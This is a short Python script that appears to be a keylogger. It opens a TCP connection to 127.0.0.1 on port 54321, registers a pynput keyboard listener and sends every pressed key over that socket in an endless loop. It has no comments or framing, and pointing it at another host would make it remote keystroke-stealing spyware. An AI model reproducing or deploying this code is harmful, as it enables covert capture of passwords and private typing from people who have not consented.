import socket
from pynput.keyboard import Listener
socket_family = socket.AF_INET
socket_type = socket.SOCK_STREAM

server = socket.socket(socket_family, socket_type, proto=0)
host = '127.0.0.1'
port = 54321
server.connect((host, port))

def on_press(key):
    try:
        server.send(bytes(str(key.char), encoding='utf-8'))
        print('sent')
    except AttributeError:
        server.send(bytes(str(key), encoding='utf-8'))
while True:
    with Listener(on_press=on_press) as listener:
         listener.join()

